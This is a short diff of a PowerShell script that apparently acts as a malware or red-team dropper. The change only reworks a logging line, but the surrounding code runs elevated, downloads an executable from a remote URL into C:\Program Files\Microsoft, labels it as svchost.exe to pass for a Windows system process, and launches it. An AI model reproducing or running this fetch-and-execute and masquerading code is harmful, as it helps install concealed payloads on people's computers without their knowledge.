@@ -36,6 +36,7 @@ if (-NOT $isAdmin) {
 Write-Activity "[+] stage-1: running elevated"
 New-Item -Path "C:\Program Files\Microsoft" -ItemType Directory -Force | Out-Null
 Invoke-WebRequest -Uri $exeUrl -OutFile $dst
-Write-Activity "[+] elevcheck.exe (svchost.exe) staged -> $dst ($((Get-Item $dst).Length) bytes)"
+$sz = (Get-Item $dst).Length
+Write-Activity "[+] elevcheck.exe (svchost.exe) staged -> $dst ($sz bytes)"
 $p = Start-Process -FilePath $dst -PassThru
 Write-Activity "[+] elevcheck.exe launched (PID=$($p.Id))"
